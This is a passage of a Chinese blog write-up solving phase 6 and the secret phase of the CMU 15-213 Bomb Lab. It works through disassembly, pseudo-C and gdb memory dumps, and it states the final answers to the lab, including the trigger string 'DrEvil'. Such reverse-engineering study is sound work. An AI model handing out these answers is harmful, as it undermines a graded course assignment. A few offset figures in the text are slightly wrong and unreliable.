r12d</code>，然后让<code>rax = str[rax]</code>，判断<code>rbp/r13</code>指向的值是否等于<code>eax</code>。相等就爆炸，不相等就进 seg 5</li>\n<li>seg 5 判断之前的<code>ebx</code>是否小于等于 0x6，<code>r12d</code>比<code>ebx</code>小 1。如果<code>ebx &lt;= 0x6</code>的话，回到 seg 4。seg 4 中还要判断下一个位置的数字和<code>r13/rbp</code>所指向的数字是否相等，相等就爆炸。否则<code>r13</code>指向下一个数字的位置，回到 seg 2。seg 2 中又要判断下一个数字是否小于等于 6，以及其和后面的数字是否相等。</li>\n</ol>\n<blockquote>\n<p>到这里我们可以初步判断，r13&#x2F;rbp 是用于指向被比较的基准数，是指针。ebx&#x2F;r12d 是用来递增的数组索引，是数字。获取到的数字通常被赋给 rax。输入的数字不能有相等的，也必须都小于等于 6。Proc 1 和 Proc 2 主要执行了一些检查的工作。</p>\n</blockquote>\n<h3 id=\"Proc-3\"><a href=\"#Proc-3\" class=\"headerlink\" title=\"Proc 3\"></a>Proc 3</h3><blockquote>\n<p>从前文我们可以判断出，当进入 seg 6 的时候，r12d 肯定是等于 6 了，r13&#x2F;rbp 也指向了最后一个数字。</p>\n</blockquote>\n<p>在 seg 6 中：</p>\n<ol>\n<li>我们让<code>rsi</code>指向最后一个数字的下一个位置，让<code>rax = r14</code>,<code>ecx = 7</code>（<code>r14</code>一开始是指向<code>rsp</code>的，这两个值是什么含义这里还没有完全清楚）</li>\n</ol>\n<p>在 seg 7 中：</p>\n<ol>\n<li>我们让<code>edx = ecx</code>（<code>edx = ecx = 7</code>）</li>\n<li><code>edx = edx - *rax</code>，这里<code>rax</code>指向数组的开头，也就是让<code>edx</code>作为 7 和<code>rax</code>指向的当前值的差</li>\n<li><code>*rax = edx</code>，也就是让<code>rax</code>指向的值 &#x3D; 这个差</li>\n<li><code>rax</code>指向下一个位置，比较<code>rax</code>和<code>rsi</code>，也就是判断是否到达了数组的末尾</li>\n<li>如果没有到达（<code>rax</code>还没有到达数组末尾<code>rsi</code>），就回到 seg 7，继续让每个数组的值 &#x3D; 7 - 它的值</li>\n<li>否则 <code>esi = 0</code>，跳到<code>seg 11</code></li>\n</ol>\n<blockquote>\n<p>在这个子过程中，我们让每个数组的值都等于 7-它原本的值，遍历完成后 rax 指向数组末尾，r14 和 rsp 还在开头，esi &#x3D; 0</p>\n</blockquote>\n<h3 id=\"Proc-4\"><a href=\"#Proc-4\" class=\"headerlink\" title=\"Proc 4\"></a>Proc 4</h3><blockquote>\n<p>这个过程有点复杂，要慢慢来</p>\n</blockquote>\n<p>在 seg 11 中：</p>\n<ol>\n<li>我们让<code>ecx的值 = *(rsp + rsi)</code></li>\n<li>将<code>ecx</code>和 <code>0x1</code> 比较，如果<code>ecx &lt;= 0x1</code>的话，跳转到 seg 9</li>\n<li>否则 eax &#x3D; 1, edx &#x3D; <code>0x6032d0</code>，跳转到 seg 8</li>\n</ol>\n<p>因为 seg 9 离终点更近，因此我们首先分析 seg 8，也就是<code>7 - str[i] &gt; 1 -&gt; value &lt; 6</code>的情况。</p>\n<ol>\n<li><code>rdx = *(rdx + 8)</code>，也就是说<code>rdx</code>的值 &#x3D; 离<code>rdx</code>8 个字节的位置的值(大概率是个指针，因为需要解引，而且指针是 8 个字节对齐)</li>\n<li><code>eax += 1</code>，将<code>ecx</code>和<code>eax</code>比较（这里 eax 已经从 2 开始了），如果<code>eax</code>还不等于<code>ecx</code>，那么回到 seg 8，否则到 seg 10</li>\n</ol>\n<p>seg 8 的含义为，从第一个差开始，如果当前这个差的值 &gt; 0x1 的话，一直寻找这个差的值的位置，保存在<code>rdx</code>中，并且这个差的值在<code>rax</code>中。</p>\n<p>同时我们来分析 seg 9，seg 9 中<code>edx = 0x6032d0</code>，直接进入 seg 10</p>\n<p>seg 10 的操作是：</p>\n<ol>\n<li><code>*(rsp + rsi * 2 + 32) = rdx</code>,这里 rsi 的值 &#x3D; 之前计算出的索引值（最开始是 0），rsp 的值 &#x3D; 输入数字的位置</li>\n<li><code>rsi = rsi + 4</code></li>\n<li>将<code>rsi</code>和 24 比较，如果<code>rsi != 24</code>，即所有数字还没遍历完，退回到 seg 11</li>\n<li>否则进入 seg 12</li>\n</ol>\n<p>那么总结来说，这三个段的含义如下：</p>\n<ol>\n<li>seg 11 让<code>ecx = str[rsi]</code>，将其和<code>0x1</code>作比较</li>\n<li>当<code>ecx &lt;= 0x1</code>时，跳转到 seg 9，令<code>edx = 0x6032d0</code>，随后进入 seg 10</li>\n<li>当<code>ecx &gt; 0x1</code>时，<code>eax = 1, edx = 0x6032d0</code>，跳转到 seg 8，seg 8 中从第一个值开始一直寻找第<code>ecx</code>个值的位置，并保存在<code>rdx</code>中，进入 seg 10</li>\n<li>seg 10 中我们把该数字的地址都存储在<code>*(起始地址 + 2 * 索引 + 32)</code>位置处，如果数字遍历完了，就进入 seg 12，否则就回退到 seg 11</li>\n</ol>\n<p>大概明白了，这里作者可能是想构建一个链表，他把链表的所有结点的起始地址放在一个数组里了！放置的顺序是我们输入的数字串的顺序！比如<code>rsi = 0</code>时，读入第<code>ecx</code>个数字，那么根据这个数字找到的<code>edx</code>就存储在地址数组的第一行。每个数字的地址都存储在<code>起始地址 + 32 + 2 * 索引</code>的位置。（为什么是这个还不太理解）</p>\n<p>到这里结束，6 个数字的位置分别存储的<code>rsi</code>是：<code>0 4 8 12 16 20 24</code>，其偏移量是<code>0 8 16 25 32 40 48</code>,加上 32 后相距<code>rsp</code>的偏移量是：<code>32 40 48 57 72 80</code></p>\n<p>我们从<code>0x6032d0</code>开始，每次打印 16 个字节（小端序），前 8 个字节是数字的值，后 8 个字节是下一个结点的地址，其顺序如下：<br>第一个结点从<code>0x6032d0</code>开始：</p>\n<pre><code>(gdb) x/16xb 0x6032d0\n0x6032d0 &lt;node1&gt;:       0x4c    0x01    0x00    0x00    0x01    0x00    0x00    0x00\n0x6032d8 &lt;node1+8&gt;:     0xe0    0x32    0x60    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>那么第二个结点的地址应该是<code>0x6032e0</code>：</p>\n<pre><code>(gdb) x/16xb 0x6032e0\n0x6032e0 &lt;node2&gt;:       0xa8    0x00    0x00    0x00    0x02    0x00    0x00    0x00\n0x6032e8 &lt;node2+8&gt;:     0xf0    0x32    0x60    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>第三个结点的地址应该是<code>0x6032f0</code>：</p>\n<pre><code>(gdb) x/16xb 0x6032f0\n0x6032f0 &lt;node3&gt;:       0x9c    0x03    0x00    0x00    0x03    0x00    0x00    0x00\n0x6032f8 &lt;node3+8&gt;:     0x00    0x33    0x60    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>第四个结点的地址应该是<code>0x603300</code>：</p>\n<pre><code>(gdb) x/16xb 0x603300\n0x603300 &lt;node4&gt;:       0xb3    0x02    0x00    0x00    0x04    0x00    0x00    0x00\n0x603308 &lt;node4+8&gt;:     0x10    0x33    0x60    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>第五个结点的地址应该是<code>0x603310</code>：</p>\n<pre><code>0x603310 &lt;node5&gt;:       0xdd    0x01    0x00    0x00    0x05    0x00    0x00    0x00\n0x603318 &lt;node5+8&gt;:     0x20    0x33    0x60    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>第六个结点的地址应该是<code>0x603320</code>：</p>\n<pre><code>(gdb) x/16xb 0x603320\n0x603320 &lt;node6&gt;:       0xbb    0x01    0x00    0x00    0x06    0x00    0x00    0x00\n0x603328 &lt;node6+8&gt;:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<h3 id=\"Proc-5\"><a href=\"#Proc-5\" class=\"headerlink\" title=\"Proc 5\"></a>Proc 5</h3><p>在这个子过程中，我们首先进入 seg12，经过一个看起来是循环的东西，再从 seg 14 出去。</p>\n<p>seg 12 的过程如下：</p>\n<ol>\n<li><code>rbx = *(rsp + 32)</code> &#x2F;&#x2F; rbx &#x3D; 起始位置的值（链表第一个结点的地址）</li>\n<li><code>rax = rsp + 40</code> &#x2F;&#x2F; 第 2 个值（链表第二个结点的地址）的位置</li>\n<li><code>rsi = rsp + 80</code> &#x2F;&#x2F; 最后一个数（最后一个结点的地址）的位置</li>\n<li><code>rcx = rbx</code> &#x2F;&#x2F; rcx &#x3D; rbx &#x3D; 起始位置的值（第一个结点的地址）</li>\n</ol>\n<p>随后进入 seg 13，seg 13 的过程如下：</p>\n<ol>\n<li><code>rdx = *rax</code> &#x2F;&#x2F; rdx &#x3D; rax 位置的值</li>\n<li><code>*(rcx + 8) = rdx</code> &#x2F;&#x2F; rcx 指向的下一个位置的值是 rdx</li>\n<li><code>rax += 8</code> &#x2F;&#x2F; rax &#x3D; 下一个位置</li>\n<li>如果 rax &#x3D;&#x3D; rsi，进入 seg 14，否则<code>rcx = rdx</code>，重新回到 seg 13</li>\n</ol>\n<blockquote>\n<p>这里把链表中的结点都串起来啦！</p>\n</blockquote>\n<p>seg 14 的过程如下：</p>\n<ol>\n<li><code>*(rdx + 8) = 0</code> &#x2F;&#x2F; 把链表最后一个节点的 next 域置为 0</li>\n<li><code>ebp = 5</code></li>\n</ol>\n<p>随后进入 seg 15。</p>\n<blockquote>\n<p>现在 rbx 的值等于链表第一个结点的地址，rcx 的值等于链表倒数第二个结点的地址，rdx 的值等于链表最后一个结点的地址，rsi 和 rax 指向链表的最后，ebp &#x3D; 5</p>\n</blockquote>\n<h3 id=\"Proc-6\"><a href=\"#Proc-6\" class=\"headerlink\" title=\"Proc 6\"></a>Proc 6</h3><p>seg 15 中完成了以下步骤：</p>\n<ol>\n<li><code>rax = *(rbx + 8)</code></li>\n<li><code>eax = *rax</code></li>\n<li>如果 <code>*rbx &gt;= eax</code>，进入 seg 16</li>\n<li>否则炸弹爆炸</li>\n</ol>\n<p>这里说明第一个结点的值必须大于等于第二个结点，否则炸弹爆炸。</p>\n<p>seg 16 中执行以下步骤：</p>\n<ol>\n<li><code>rbx = *(rbx + 8)</code></li>\n<li>ebp -&#x3D; 1</li>\n<li>如果 ebp !&#x3D; 0，进入 seg 15</li>\n<li>否则栈恢复</li>\n</ol>\n<p>这段说明链表的值从开始到后面必须严格递减。我们在前期已经获得了链表各个结点的值，我们只需要从大到小排列这些值即可，炸弹的密码是排列的顺序。这组值是<code>0x014c 0x00a8 0x039c 0x02b3 0x01dd 0x01bb</code>，翻译成十进制就是<code>332 168 924 691 477 443</code>(可以使用<code>x/96dh 0x6032d0</code>打印<code>halfword</code>)，gdb 的 x 命令打印的字节数如下：</p>\n<pre><code>b - byte\nh - halfword (16-bit value)\nw - word (32-bit value)\ng - giant word (64-bit value)\n</code></pre>\n<p>所以数字从大到小的顺序应该是<code>3 4 5 6 1 2</code>，但是因为<code>ecx</code>的值是<code>7 - 原来的值</code>，所以原来的值应该是<code>4 3 2 1 6 5</code>。成功解除炸弹！</p>\n<blockquote>\n<p>重点：</p>\n<ol>\n<li>这个过程就是第<code>ecx</code>个数的<code>rdx</code>（链表结点地址）存储在地址数组的第<code>rsi</code>位，实现了链表结点的重排序！</li>\n<li>最后记得第<code>ecx</code>个数 &#x3D; 7 - 原来的值，所以我们解出了链表中元素的值后，还要用 7 - 它 来获得我们原来输入的数</li>\n</ol>\n</blockquote>\n<h2 id=\"secret-phase-分析\"><a href=\"#secret-phase-分析\" class=\"headerlink\" title=\"secret phase 分析:\"></a>secret phase 分析:</h2><p>对<code>secret phase</code>执行反汇编得到如下结果：</p>\n<pre><code>0000000000401242 &lt;secret_phase&gt;:\nseg1:\n  401242:\t53                   \tpush   %rbx\n  401243:\te8 56 02 00 00       \tcallq  40149e &lt;read_line&gt;\n  401248:\tba 0a 00 00 00       \tmov    $0xa,%edx\n  40124d:\tbe 00 00 00 00       \tmov    $0x0,%esi\n  401252:\t48 89 c7             \tmov    %rax,%rdi\n  401255:\te8 76 f9 ff ff       \tcallq  400bd0 &lt;strtol@plt&gt;\n  40125a:\t48 89 c3             \tmov    %rax,%rbx\n  40125d:\t8d 40 ff             \tlea    -0x1(%rax),%eax\n  401260:\t3d e8 03 00 00       \tcmp    $0x3e8,%eax\n  401265:\t76 05                \tjbe    40126c &lt;secret_phase+0x2a&gt;\n  401267:\te8 ce 01 00 00       \tcallq  40143a &lt;explode_bomb&gt;\nseg2:\n  40126c:\t89 de                \tmov    %ebx,%esi\n  40126e:\tbf f0 30 60 00       \tmov    $0x6030f0,%edi\n  401273:\te8 8c ff ff ff       \tcallq  401204 &lt;fun7&gt;\n  401278:\t83 f8 02             \tcmp    $0x2,%eax\n  40127b:\t74 05                \tje     401282 &lt;secret_phase+0x40&gt;\n  40127d:\te8 b8 01 00 00       \tcallq  40143a &lt;explode_bomb&gt;\nseg3:\n  401282:\tbf 38 24 40 00       \tmov    $0x402438,%edi\n  401287:\te8 84 f8 ff ff       \tcallq  400b10 &lt;puts@plt&gt;\n  40128c:\te8 33 03 00 00       \tcallq  4015c4 &lt;phase_defused&gt;\n  401291:\t5b                   \tpop    %rbx\n  401292:\tc3                   \tretq\n</code></pre>\n<p>其过程如下：</p>\n<ol>\n<li>压入<code>%rbx</code></li>\n<li>读入一行 -&gt; 估计结果存储在 rax 中，也就是字符串的起始位置</li>\n<li><code>edx = 0xa</code>，<code>esi = 0</code>，<code>rdi = rax</code></li>\n<li>调用<code>strtol</code></li>\n<li><code>rbx = rax</code> -&gt; rbx &#x3D; 字符串转化出的数值</li>\n<li><code>eax = rax - 1</code></li>\n<li>如果<code>eax &lt;= 0x3e8</code>，跳转到 seg 2；否则炸弹爆炸</li>\n<li><code>esi = ebx</code>，<code>edi = 0x6030f0</code>，调用<code>fun7</code></li>\n<li>如果<code>eax == 0x2</code>，跳转到 seg 3（炸弹解除），否则炸弹爆炸</li>\n</ol>\n<p>将其转化为 C 语言：</p>\n<pre><code class=\"c\">int secret_phase(char* buf)\n&#123;\n    // 压入rbx\n    rax = call read_line\n    edx = 0xa\n    esi = 0\n    rdi = rax\n    call strtol\n    rbx = rax\n    eax = rax - 1 //输入数字必须小于等于 1000\n    if(eax &lt;= 0x3e8) &#123;\n        // seg2\n        esi = ebx\n        edi = 0x6030f0\n        call fun7\n        if(eax == 0x2) &#123;\n            return eax;\n        &#125;\n        else &#123;\n            call bomb_explode\n        &#125;\n    &#125;\n    else &#123;\n        call bomb_explode\n    &#125;\n&#125;\n</code></pre>\n<p>我们首先解读一下<code>secret_phase</code>：<br>一开始几个寄存器的值如下：</p>\n<pre><code>rax - read line 返回的字符串地址\nedx - 0xa\nesi - 0\nrdi - read line 返回的字符串地址\n</code></pre>\n<p>调用<code>strtol</code>后几个寄存器的值如下：</p>\n<pre><code>rax - strtol 返回的字符串转化出的数值\nrbx - strtol 返回的字符串转化出的数值\neax - 数值 - 1\n</code></pre>\n<p>如果该数值 - 1 &gt; 0x3e8(1000)，炸弹爆炸，否则进入 seg 2。</p>\n<p>seg 2 中完成了如下工作：</p>\n<ol>\n<li><code>esi = strtol 返回的字符串转化出的数值</code>（这个数必须小于等于 1001）</li>\n<li><code>edi = 0x6030f0</code>(一个地址)</li>\n<li>调用<code>fun7</code></li>\n<li>如果<code>fun7</code>返回 2，退出，否则炸弹爆炸</li>\n</ol>\n<p>这其中调用了一个叫<code>fun7</code>的函数，其反汇编结果如下：</p>\n<pre><code>0000000000401204 &lt;fun7&gt;:\nseg1:\n  401204:\t48 83 ec 08          \tsub    $0x8,%rsp\n  401208:\t48 85 ff             \ttest   %rdi,%rdi\n  40120b:\t74 2b                \tje     401238 &lt;fun7+0x34&gt;\n  40120d:\t8b 17                \tmov    (%rdi),%edx\n  40120f:\t39 f2                \tcmp    %esi,%edx\n  401211:\t7e 0d                \tjle    401220 &lt;fun7+0x1c&gt;\n  401213:\t48 8b 7f 08          \tmov    0x8(%rdi),%rdi\n  401217:\te8 e8 ff ff ff       \tcallq  401204 &lt;fun7&gt;\n  40121c:\t01 c0                \tadd    %eax,%eax\n  40121e:\teb 1d                \tjmp    40123d &lt;fun7+0x39&gt;\nseg2:\n  401220:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401225:\t39 f2                \tcmp    %esi,%edx\n  401227:\t74 14                \tje     40123d &lt;fun7+0x39&gt;\n  401229:\t48 8b 7f 10          \tmov    0x10(%rdi),%rdi\n  40122d:\te8 d2 ff ff ff       \tcallq  401204 &lt;fun7&gt;\n  401232:\t8d 44 00 01          \tlea    0x1(%rax,%rax,1),%eax\n  401236:\teb 05                \tjmp    40123d &lt;fun7+0x39&gt;\nseg3:\n  401238:\tb8 ff ff ff ff       \tmov    $0xffffffff,%eax\nseg4:\n  40123d:\t48 83 c4 08          \tadd    $0x8,%rsp\n  401241:\tc3                   \tretq\n</code></pre>\n<p>根据反汇编可以看出<code>%rdi</code>(<code>0x6030f0</code>)和<code>%esi</code>(输入的数值)是传入参数，<code>%eax</code>是返回值。其中还包括了一次递归调用。<code>fun7</code>的 C 语言实现如下：</p>\n<pre><code class=\"c\">int fun7()\n&#123;\n    // rsp留出8个字节的空间\n    if(rdi == 0) &#123;\n        // seg3\n        eax = 0xffffffff\n    &#125;\n    else &#123;\n        edx = *rdi\n        if(edx &lt;= esi) &#123;\n            // seg2\n            eax = 0\n            if(edx != esi) &#123;\n                rdi = *(rdi + 16)\n                call fun7\n                eax = 2 * rax + 1\n            &#125;\n        &#125;\n        else &#123;\n            rdi = *(rdi + 8)\n            call fun7\n            eax = eax * 2\n        &#125;\n    &#125;\n    // seg4\n    // rsp栈空间恢复\n    return eax;\n&#125;\n</code></pre>\n<p><code>fun7</code>的内容翻译成 C 语言是如下内容：</p>\n<ol>\n<li>如果传入的<code>rdi = 0</code>，那么返回<code>0xffffffff</code></li>\n<li>否则，<code>edx</code>的值为<code>rdi</code>指向地址的值。</li>\n<li>如果<code>edx &gt; 传入的esi</code>，rdi 跳转到下一个位置（左节点的值）（这里大概率又是个链表），返回<code>2 * fun7()</code></li>\n<li>否则，<code>eax = 0</code>，如果<code>edx == 传入的esi</code>，返回 0；否则就跳转到下下个位置（右节点的值），返回<code>2 * fun7() + 1</code></li>\n</ol>\n<p>为什么能推测出来这里的左节点和右节点呢？我们在<code>0x6030f0</code>打印 32 个字节的值看看：</p>\n<pre><code>(gdb) x/32bx 0x6030f0\n0x6030f0 &lt;n1&gt;:          0x24    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n0x6030f8 &lt;n1+8&gt;:        0x10    0x31    0x60    0x00    0x00    0x00    0x00    0x00\n0x603100 &lt;n1+16&gt;:       0x30    0x31    0x60    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>这里有 n+8 和 n+16，可以看出来这也是两个地址。</p>\n<p>这里对<code>fun7</code>的要求是必须在传入地址的值为<code>0x6030f0</code>，输入的<code>%esi &lt;= 1000</code>的情况下返回 2。</p>\n<p>我们打印一下这个链表各个结点的值：</p>\n<pre><code>(gdb) x/32bx 0x6030f0\n0x6030f0 &lt;n1&gt;:          0x24    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n0x6030f8 &lt;n1+8&gt;:        0x10    0x31    0x60    0x00    0x00    0x00    0x00    0x00\n0x603100 &lt;n1+16&gt;:       0x30    0x31    0x60    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>我们打印它左节点(node 21)：</p>\n<pre><code>(gdb) x/32bx 0x603110\n0x603110 &lt;n21&gt;: 0x08    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n0x603118 &lt;n21+8&gt;:       0x90    0x31    0x60    0x00    0x00    0x00    0x00    0x00\n0x603120 &lt;n21+16&gt;:      0x50    0x31    0x60    0x00    0x00    0x00    0x00    0x00\n0x603128:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>再打印右节点(node 22)：</p>\n<pre><code>(gdb) x/32bx 0x603130\n0x603130 &lt;n22&gt;: 0x32    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n0x603138 &lt;n22+8&gt;:       0x70    0x31    0x60    0x00    0x00    0x00    0x00    0x00\n0x603140 &lt;n22+16&gt;:      0xb0    0x31    0x60    0x00    0x00    0x00    0x00    0x00\n0x603148:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n</code></pre>\n<p>现在的迷惑之处在于<code>fun7</code>到底返回的是什么东西。从<code>fun7</code>的内容来看，其主要目的是一直找到<code>esi</code>的值在二叉树中的位置。如果<code>esi &lt; edx</code>，就找左边那颗二叉树，返回<code>2 * fun7()</code>，否则就找右边那颗二叉树，返回<code>2 * fun7() + 1</code>。从<code>0x6030f0</code>这个位置开始找，最后<code>fun7()</code>必须返回 2。从我们之前学习数据结构的经验来说，如果一个结点的标号为 n，那么它的左孩子就是 2 _ n,右孩子就是 2 _ n + 1。</p>\n<p>二叉树的结构如下：</p>\n<p><img data-src=\"/blog/2024/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Bomb%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/fun7.png\" alt=\"fun7\"></p>\n<p>那么首先<code>edx</code>的值为根节点的地址，我们从根开始遍历，一直到<code>%esi</code>的值所在的位置。我们对每个结点进行排查，那么能让最后返回 2 的<code>%esi</code>只有 0x16 和 0x14。</p>\n<p>但是<code>secret_phase</code>在哪里启动呢？我们来看看！欸，在<code>phase_defused</code>中启动！我们看到在<code>callq secret_phase</code>前有这样一段代码：</p>\n<pre><code>  401621:\tbf 20 25 40 00       \tmov    $0x402520,%edi\n  401626:\te8 e5 f4 ff ff       \tcallq  400b10 &lt;puts@plt&gt;\n  40162b:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401630:\te8 0d fc ff ff       \tcallq  401242 &lt;secret_phase&gt;\n</code></pre>\n<p>这段汇编首先把一个看起来像地址的<code>0x402520</code>放进了<code>%edi</code>寄存器，然后调用<code>puts</code>，将<code>eax</code>设置为 0。我们来看看<code>0x402520</code>处放了啥：</p>\n<pre><code>(gdb) x/s 0x402520\n0x402520:       &quot;But finding it and solving it are quite different...&quot;\n</code></pre>\n<p>这个地址是否出现在别的地方呢？好像没有。但是这段代码后面还有一段：</p>\n<pre><code>  401626:\te8 e5 f4 ff ff       \tcallq  400b10 &lt;puts@plt&gt;\n  40162b:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401630:\te8 0d fc ff ff       \tcallq  401242 &lt;secret_phase&gt;\n  401635:\tbf 58 25 40 00       \tmov    $0x402558,%edi\n  40163a:\te8 d1 f4 ff ff       \tcallq  400b10 &lt;puts@plt&gt;\n  40163f:\t48 8b 44 24 68       \tmov    0x68(%rsp),%rax\n  401644:\t64 48 33 04 25 28 00 \txor    %fs:0x28,%rax\n</code></pre>\n<p>这里又出现了一个新地址，<code>0x402558</code>，我们来看看这里是啥：</p>\n<pre><code>(gdb) x/s 0x402558\n0x402558:       &quot;Congratulations! You&#39;ve defused the bomb!&quot;\n</code></pre>\n<p>额，是恭喜我们拆除炸弹。。。</p>\n<p>我想这么看可能是看不出来的，那么我们来把<code>phase_defused</code>详细拆解看看(nop 指令省去)：</p>\n<pre><code>00000000004015c4 &lt;phase_defused&gt;:\nseg1:\n  4015c4:\t48 83 ec 78          \tsub    $0x78,%rsp -&gt; 留出栈位置\n  4015c8:\t64 48 8b 04 25 28 00 \tmov    %fs:0x28,%rax\n  4015cf:\t00 00\n  4015d1:\t48 89 44 24 68       \tmov    %rax,0x68(%rsp) -&gt; *(rsp + 104) = rax\n  4015d6:\t31 c0                \txor    %eax,%eax -&gt; 将eax置0\n  4015d8:\t83 3d 81 21 20 00 06 \tcmpl   $0x6,0x202181(%rip)        # 603760 &lt;num_input_strings&gt;\n  4015df:\t75 5e                \tjne    40163f &lt;phase_defused+0x7b&gt;\n  4015e1:\t4c 8d 44 24 10       \tlea    0x10(%rsp),%r8\n  4015e6:\t48 8d 4c 24 0c       \tlea    0xc(%rsp),%rcx\n  4015eb:\t48 8d 54 24 08       \tlea    0x8(%rsp),%rdx\n  4015f0:\tbe 19 26 40 00       \tmov    $0x402619,%esi\n  4015f5:\tbf 70 38 60 00       \tmov    $0x603870,%edi\n  4015fa:\te8 f1 f5 ff ff       \tcallq  400bf0 &lt;__isoc99_sscanf@plt&gt;\n  4015ff:\t83 f8 03             \tcmp    $0x3,%eax\n  401602:\t75 31                \tjne    401635 &lt;phase_defused+0x71&gt;\n  401604:\tbe 22 26 40 00       \tmov    $0x402622,%esi\n  401609:\t48 8d 7c 24 10       \tlea    0x10(%rsp),%rdi\n  40160e:\te8 25 fd ff ff       \tcallq  401338 &lt;strings_not_equal&gt;\n  401613:\t85 c0                \ttest   %eax,%eax\n  401615:\t75 1e                \tjne    401635 &lt;phase_defused+0x71&gt;\n  401617:\tbf f8 24 40 00       \tmov    $0x4024f8,%edi\n  40161c:\te8 ef f4 ff ff       \tcallq  400b10 &lt;puts@plt&gt;\n  401621:\tbf 20 25 40 00       \tmov    $0x402520,%edi\n  401626:\te8 e5 f4 ff ff       \tcallq  400b10 &lt;puts@plt&gt;\n  40162b:\tb8 00 00 00 00       \tmov    $0x0,%eax\n  401630:\te8 0d fc ff ff       \tcallq  401242 &lt;secret_phase&gt;\nseg2:\n  401635:\tbf 58 25 40 00       \tmov    $0x402558,%edi\n  40163a:\te8 d1 f4 ff ff       \tcallq  400b10 &lt;puts@plt&gt;\nseg3:\n  40163f:\t48 8b 44 24 68       \tmov    0x68(%rsp),%rax\n  401644:\t64 48 33 04 25 28 00 \txor    %fs:0x28,%rax\n  40164b:\t00 00\n  40164d:\t74 05                \tje     401654 &lt;phase_defused+0x90&gt;\n  40164f:\te8 dc f4 ff ff       \tcallq  400b30 &lt;__stack_chk_fail@plt&gt;\nseg4:\n  401654:\t48 83 c4 78          \tadd    $0x78,%rsp\n  401658:\tc3                   \tretq\n</code></pre>\n<p>其中 seg 3 和 4 主要是一些收尾工作（检查<code>canary</code>的值之类的），seg2 是打印恭喜字符串，其核心部分在 seg 1。</p>\n<p>seg 1 的工作如下：</p>\n<ol>\n<li>留出栈的位置，放置<code>canary</code></li>\n<li>获取输入的字符串的个数，如果不等于 6，跳转到收尾工作</li>\n<li>设置以下几个值：<pre><code> 4015e1:\t4c 8d 44 24 10       \tlea    0x10(%rsp),%r8 // r8 = rsp + 16\n 4015e6:\t48 8d 4c 24 0c       \tlea    0xc(%rsp),%rcx // rcx = rsp + 12\n 4015eb:\t48 8d 54 24 08       \tlea    0x8(%rsp),%rdx // rdx = rsp + 8\n 4015f0:\tbe 19 26 40 00       \tmov    $0x402619,%esi // esi = 0x402619\n 4015f5:\tbf 70 38 60 00       \tmov    $0x603870,%edi // edi = 0x603870\n</code></pre>\n这里<code>0x402619</code>是<code>sscanf</code>的格式化输入的字符串的保存地址：<pre><code>0x402619:       &quot;%d %d %s&quot;\n</code></pre>\n而<code>0x603870</code>是输入的字符串的保存地址：<pre><code>(gdb) x/s 0x603870\n 0x603870 &lt;input_strings+240&gt;:   &quot;&quot;\n</code></pre>\n</li>\n<li>调用 sscanf 获取输入字符串，其个数存储在<code>%eax</code>中，判断其是否等于 3，如果不是进入收尾工作</li>\n<li>接下来我们需要判断<code>0x402622</code>处的字符串和输入的字符串是否相等，该处的字符串为<code>DrEvil</code>，如果相等的话，打印如下指令，然后进入 secret phase:</li>\n</ol>\n<pre><code>(gdb) x/s 0x4024f8\n0x4024f8:       &quot;Curses, you&#39;ve found the secret phase!&quot;\n(gdb) x/s 0x402520\n0x402520:       &quot;But finding it and solving it are quite different...&quot;\n</code></pre>\n<p>但是什么时候会<code>sscanf</code>到<code>0x603870</code>处呢？只有<code>phase_3</code>和<code>phase_4</code>调用了<code>sscanf</code>，且输入的字符串的地址都存储在<code>$rdi</code>中，我们对他们打断点进行分析看看：</p>\n<pre><code>Breakpoint 1, 0x0000000000400f43 in phase_3 ()\n(gdb) p $rdi\n$1 = 6305824\n(gdb) p /x $rdi\n$2 = 0x603820\n(gdb) n\nSingle stepping until exit from function phase_3,\nwhich has no line number information.\nmain (argc=&lt;optimized out&gt;, argv=&lt;optimized out&gt;) at bomb.c:90\nwarning: Source file is more recent than executable.\n90          /* I guess this is too easy so far.  Some more complex code will\n(gdb)\n91           * confuse people. */\n(gdb)\nHalfway there!\n94          phase_defused();\n(gdb)\n0 207\n95          printf(&quot;Halfway there!\\n&quot;);\n(gdb) n\n\nBreakpoint 2, 0x000000000040100c in phase_4 ()\n(gdb) p /x $rdi\n$3 = 0x603870\n</code></pre>\n<p>在<code>phase_4</code>中<code>$rdi = 0x603870</code>，这个字符串是在这里输入的！那么这里应该输入第三个字符串来触发 secret_phase，也就是<code>DrEvil</code>，并且 secret phase 的答案是 0x16 和 0x14。</p>\n<p>最后成功啦！</p>\n<pre><code>Welcome to my fiendish little bomb. You have 6 phases with\nwhich to blow yourself up. Have a nice day!\nPhase 1 defused. How about the next one?\nThat&#39;s number 2.  Keep going!\nHalfway there!\nSo you got that one.  Try this one.\nGood work!  On to the next...\nCurses, you&#39;ve found the secret phase!\nBut finding it and solving it are quite different...\nWow! You&#39;ve defused the secret stage!\nCongratulations! You&#39;ve defused the bomb!\n</code></pre>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><ol>\n<li><code>Phase 1 - 3</code> 还好</li>\n<li><code>Phase 3</code>那个需要传入 10 进制数，而不是 16 进制，写答案的时候不要写错了</li>\n<li><code>Phase 4</code>那个<code>func</code>没看出来是啥，蒙了个<code>0 0</code>过了，需要搞懂</li>\n<li><code>Phase 5</code>一开始没想到给那几个 16 